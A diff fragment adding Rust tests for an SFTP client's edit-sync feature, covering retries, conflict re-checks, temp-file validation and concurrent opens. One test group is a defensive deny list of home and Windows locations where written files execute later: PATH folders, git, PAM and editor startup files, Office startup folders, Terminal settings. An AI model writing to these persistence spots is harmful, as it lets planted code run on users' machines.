+            .push("/srv/app.conf".to_string());
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        let seen = || events.lock().unwrap().clone();
+
+        std::fs::write(&staged, b"my edit").unwrap();
+        sync.clone().react(WatchVerdict::Save).await;
+        for _ in 0..3 {
+            sync.clone().react(WatchVerdict::Rescan).await;
+        }
+        assert_eq!(seen().len(), 1, "{:?}", seen());
+        assert_eq!(seen()[0]["ok"], false, "{:?}", seen());
+        assert_eq!(
+            temps_in(&fx, "/srv").len(),
+            1,
+            "{:?}",
+            temps_in(&fx, "/srv")
+        );
+
+        // A real save tries again - and leaves at most one temporary file.
+        sync.clone().react(WatchVerdict::Save).await;
+        assert_eq!(seen().len(), 2, "{:?}", seen());
+        assert_eq!(
+            temps_in(&fx, "/srv").len(),
+            1,
+            "{:?}",
+            temps_in(&fx, "/srv")
+        );
+
+        // Once the server allows it, the next save goes in; nothing is left.
+        fx.knobs.lock().unwrap().remove_refused.clear();
+        sync.clone().react(WatchVerdict::Save).await;
+        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
+        assert!(
+            temps_in(&fx, "/srv").is_empty(),
+            "{:?}",
+            temps_in(&fx, "/srv")
+        );
+        assert_eq!(seen().last().unwrap()["ok"], true, "{:?}", seen());
+    }
+
+    /// Item 1: with the staged copy gone, every check reported the same read
+    /// error again (five events in 1.3 s at a short period). Once is enough.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix2_an_unreadable_staged_copy_is_reported_once() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        std::fs::remove_file(&staged).unwrap();
+
+        for _ in 0..3 {
+            sync.clone().react(WatchVerdict::Rescan).await;
+        }
+
+        let events = events.lock().unwrap();
+        assert_eq!(events.len(), 1, "{events:?}");
+        let error = events[0]["error"].as_str().unwrap_or_default();
+        assert!(error.contains("could not read the saved file"), "{error}");
+    }
+
+    /// Item 2: on a server that reports neither size nor time, the re-check
+    /// before an Overwrite compared size and time only - always empty - so it
+    /// overwrote a second remote change (Bob's v3). The conflict was found by
+    /// content, so it is checked by content again.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix2_overwrite_rechecks_by_content_when_the_server_has_no_stamps() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", b"v1");
+        fx.knobs.lock().unwrap().strip_size_mtime = true;
+        let local = LocalDir::new();
+        let staged = local.0.join("staged.conf");
+        std::fs::write(&staged, b"v1").unwrap();
+        let (sync, events) =
+            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
+        fx.write("/srv/app.conf", b"v2 - Bob");
+        std::fs::write(&staged, b"my edit").unwrap();
+        sync.clone().on_change().await;
+        let first = conflict_id(&events);
+
+        fx.write("/srv/app.conf", b"v3 - Bob saved again");
+        let result = sync
+            .clone()
+            .resolve(&first, EditResolution::Overwrite)
+            .await
+            .expect("a fresh conflict, not an error");
+
+        assert_eq!(fx.read("/srv/app.conf"), b"v3 - Bob saved again");
+        assert_eq!(result["conflict"], true, "{result}");
+        let fresh = result["conflictId"].as_str().unwrap().to_string();
+        assert_ne!(fresh, first);
+        // An Overwrite of the conflict as reported goes ahead.
+        sync.clone()
+            .resolve(&fresh, EditResolution::Overwrite)
+            .await
+            .expect("overwrite");
+        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
+    }
+
+    /// Item 3: on a server that leaves the type bits out and answers "list
+    /// this folder" on a file with "permission denied", the temporary file
+    /// could not be proven to be a file, so every save failed (before round 1
+    /// they worked). A temp that is not a link and holds exactly the bytes
+    /// just written is accepted - with READLINK working or not.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix2_edit_saves_work_when_the_folder_probe_on_a_file_is_refused() {
+        use russh_sftp::protocol::StatusCode;
+        for readlink in [None, Some(StatusCode::OpUnsupported)] {
+            let (sftp, fx) = crate::sftp::testkit::serve().await;
+            fx.write("/srv/app.conf", b"v1");
+            {
+                let mut knobs = fx.knobs.lock().unwrap();
+                knobs.untyped_modes = true;
+                knobs.opendir_file_status = Some(StatusCode::PermissionDenied);
+                knobs.readlink_status = readlink;
+            }
+            let local = LocalDir::new();
+            let staged = local.0.join("staged.conf");
+            std::fs::write(&staged, b"my edit").unwrap();
+
+            let up = upload_edited_file(&sftp, &staged, "/srv/app.conf", None).await;
+
+            assert!(up.is_ok(), "{readlink:?}: {up:?}");
+            assert_eq!(fx.read("/srv/app.conf"), b"my edit", "{readlink:?}");
+            assert!(temps_in(&fx, "/srv").is_empty(), "{readlink:?}");
+        }
+    }
+
+    /// Item 4: two `sftp_open_for_edit` calls for the same file at the same
+    /// time both downloaded it, then the second ended the first - whose
+    /// caller had already handed its copy to an editor (deleted, its saves
+    /// never synced, no event). One session survives and both callers get it.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn ru6a_fix2_two_concurrent_opens_of_one_file_share_one_session() {
+        let (sftp, fx) = crate::sftp::testkit::serve().await;
+        fx.write("/srv/app.conf", &vec![b'x'; 200_000]);
+        let registry = EditRegistry::new();
+        let temp = LocalDir::new();
+        let sftp = Arc::new(sftp);
+        let emit: Arc<dyn Fn(serde_json::Value) + Send + Sync> = Arc::new(|_| {});
+        let open = || {
+            open_for_edit_in(
+                &registry,
+                sftp.clone(),
+                "sess".to_string(),
+                "/srv/app.conf".to_string(),
+                temp.0.clone(),
+                emit.clone(),
+            )
+        };
+
+        let (a, b) = tokio::join!(open(), open());
+        let (a, b) = (a.expect("first open"), b.expect("second open"));
+
+        assert_eq!(a["editId"], b["editId"], "{a} {b}");
+        assert_eq!(a["localPath"], b["localPath"], "{a} {b}");
+        let live = registry
+            .live_for_key("sess:/srv/app.conf")
+            .expect("one live session");
+        assert!(!live.is_stopped());
+        assert_eq!(a["editId"], live.edit_id());
+        let local = a["localPath"].as_str().unwrap();
+        assert!(std::path::Path::new(local).exists());
+        let staged: Vec<PathBuf> = std::fs::read_dir(&temp.0)
+            .unwrap()
+            .flatten()
+            .map(|e| e.path())
+            .collect();
+        assert_eq!(staged.len(), 1, "the second copy is deleted: {staged:?}");
+        registry.stop_all();
+    }
+
+    /// Item 6 (sec N2): places where a written file runs when a program is
+    /// next used: user folders on the PATH, git's settings, the PAM
+    /// environment and the editors' startup files (SSHSpan's edit flow starts
+    /// the system editor). Writing there is refused; reading stays allowed.
+    #[test]
+    fn ru6a_fix2_program_and_path_locations_are_refused_for_writes() {
+        let Some(home) = dirs::home_dir() else { return };
+        let at = |rel: &str| {
+            rel.split('/')
+                .fold(home.clone(), |p, part| p.join(part))
+                .display()
+                .to_string()
+        };
+        for rel in [
+            ".local/bin/ls",
+            "bin/ls",
+            ".gitconfig",
+            ".config/git/config",
+            ".pam_environment",
+            ".vimrc",
+            ".vim/plugin/evil.vim",
+            ".config/nvim/init.lua",
+            ".emacs",
+            ".emacs.d/init.el",
+            ".config/emacs/init.el",
+        ] {
+            assert!(
+                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_err(),
+                "{rel} must not be writable"
+            );
+        }
+        for rel in [
+            ".gitconfig",
+            ".vimrc",
+            ".emacs.d/init.el",
+            ".local/bin/tool",
+        ] {
+            assert!(
+                validate_sftp_local_path(&at(rel), LocalAccess::Read).is_ok(),
+                "{rel} may be uploaded"
+            );
+        }
+        for rel in [".gitconfig.bak", ".local/binaries/x", "notes.txt"] {
+            assert!(
+                validate_sftp_local_path(&at(rel), LocalAccess::Write).is_ok(),
+                "{rel} stays writable"
+            );
+        }
+    }
+
+    /// Item 6, the layout: every PATH folder inside the home folder counts
+    /// (not the home folder itself, nor folders elsewhere), and on Windows
+    /// the WindowsApps folder, Office's startup folders and template, and
+    /// Windows Terminal's settings in each of its package folders. (Unix
+    /// spellings: `/h` is not an absolute path on Windows.)
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix2_program_locations_follow_the_path_office_and_terminal() {
+        use std::path::Path;
+        let home = Path::new("/h");
+        let found = home_program_locations(
+            home,
+            &[home.join(".config"), PathBuf::from("/x/cfg")],
+            &[
+                home.join(".cargo").join("bin"),
+                home.to_path_buf(),
+                PathBuf::from("/usr/bin"),
+                PathBuf::from("relative/bin"),
+            ],
+        );
+        for p in [
+            "/h/.local/bin",
+            "/h/bin",
+            "/h/.cargo/bin",
+            "/h/.gitconfig",
+            "/h/.vim",
+            "/h/.emacs.d",
+            "/h/.config/git",
+            "/x/cfg/nvim",
+        ] {
+            assert!(found.contains(&PathBuf::from(p)), "{p}: {found:?}");
+        }
+        for p in ["/h", "/usr/bin", "relative/bin"] {
+            assert!(!found.contains(&PathBuf::from(p)), "{p}: {found:?}");
+        }
+
+        let windows = windows_program_locations(
+            Some(Path::new("/r/Roaming")),
+            Some(Path::new("/r/Local")),
+            &[PathBuf::from(
+                "/r/Local/Packages/Microsoft.WindowsTerminal_8wekyb3d8bbwe",
+            )],
+        );
+        for p in [
+            "/r/Roaming/Microsoft/Word/STARTUP",
+            "/r/Roaming/Microsoft/Excel/XLSTART",
+            "/r/Roaming/Microsoft/Templates/Normal.dotm",
+            "/r/Local/Microsoft/WindowsApps",
+            "/r/Local/Microsoft/Windows Terminal/settings.json",
+            "/r/Local/Packages/Microsoft.WindowsTerminal_8wekyb3d8bbwe/LocalState/settings.json",
+        ] {
+            assert!(windows.contains(&PathBuf::from(p)), "{p}: {windows:?}");
+        }
+        assert!(windows_program_locations(None, None, &[]).is_empty());
+    }
+
+    /// Item 6: Windows Terminal's package folders are found by name (stable,
+    /// preview, canary), and nothing else in the folder is taken for one.
+    #[cfg(unix)]
+    #[test]
+    fn ru6a_fix2_windows_terminal_packages_are_found_by_name() {
+        let local = LocalDir::new();
+        for name in [
+            "Microsoft.WindowsTerminal_8wekyb3d8bbwe",
+            "Microsoft.WindowsTerminalPreview_8wekyb3d8bbwe",
+            "Microsoft.WindowsCalculator_8wekyb3d8bbwe",
+        ] {
+            std::fs::create_dir_all(local.0.join(name)).unwrap();
+        }
+        let mut found: Vec<String> = windows_terminal_packages(&local.0)
+            .iter()
+            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
+            .collect();
+        found.sort();
+        assert_eq!(
+            found,
+            vec![
+                "Microsoft.WindowsTerminalPreview_8wekyb3d8bbwe",
+                "Microsoft.WindowsTerminal_8wekyb3d8bbwe",
+            ]
+        );
+        assert!(windows_terminal_packages(&local.0.join("missing")).is_empty());
     }
 }
